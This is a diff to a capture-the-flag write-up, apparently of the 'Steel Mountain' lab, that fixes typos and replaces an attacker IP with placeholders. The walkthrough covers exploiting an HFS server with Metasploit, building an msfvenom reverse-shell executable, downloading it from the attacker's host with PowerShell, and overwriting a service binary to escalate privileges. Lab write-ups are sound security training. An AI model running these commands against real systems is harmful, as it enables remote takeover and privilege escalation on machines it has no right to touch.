@@ -43,7 +43,7 @@ I opened metasplout using command:
 Then I searched for hfs keyword using command:
 `search hfs`
 
-It showd me followind output:
+It showed me following output:
 ![Alt text](../Screenshots/Steel_Mountain/metasploit_exploits.png)
 
 Then I selected 4th exploit and then set it's values:
@@ -58,6 +58,7 @@ Now, We need to upload a PowerUp.ps1 file to target machine. For that purpose, d
 ```bash
 upload /path/to/PowerUp.ps1
 ```
+
 This path is the path of the script in your attacker machine.
 ![Alt text](../Screenshots/Steel_Mountain/upload_powerup.png)
 
@@ -79,11 +80,15 @@ Now, I am going to replace the actual file with our maclicious file (payload), s
 
 using msfconsole, we can make our payload:
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.8.25.176 LPORT=4443 -f exe -o Advanced.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker_machine_ip LPORT=attacker_machine_port -f exe -o Advanced.exe
+```
+To transfer this payload, we need to run the python server so that we are able to access this payload from the shell of target machine. Command to run python server:
+```
+python -m http.server 8000
 ```
 Now inside the shell of target machine, run the followind command to copy the payload from attacker's machine:
 ```
-powershell -NoP -NonI -C "Invoke-WebRequest -Uri 'http://10.8.25.176:8000/Advanced.exe' -OutFile $env:USERPROFILE\\Desktop\\ASCService.exe"
+powershell -NoP -NonI -C "Invoke-WebRequest -Uri 'http://attacker_machine_ip:attacker_machine_port/Advanced.exe' -OutFile $env:USERPROFILE\\Desktop\\ASCService.exe"
 ```
 Now I copied this payload to the desired path where legitimate exe file was present, I overwrite that with my payload:
 `copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare"`
